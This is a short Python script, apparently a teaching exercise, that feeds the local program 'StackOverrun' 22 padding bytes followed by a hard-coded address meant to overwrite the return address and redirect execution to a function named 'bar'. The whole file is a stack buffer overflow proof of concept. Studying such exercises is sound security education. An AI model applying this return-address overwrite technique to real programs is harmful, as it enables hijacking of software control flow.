from subprocess import call

def main():

    addressOfBar = "\x43\x62\x55\x56"
    call(["src/bin/StackOverrun", "AAAAAAAAAAAAAAAAAAAAAA\x43\x62\x55\x56"])

   
main()
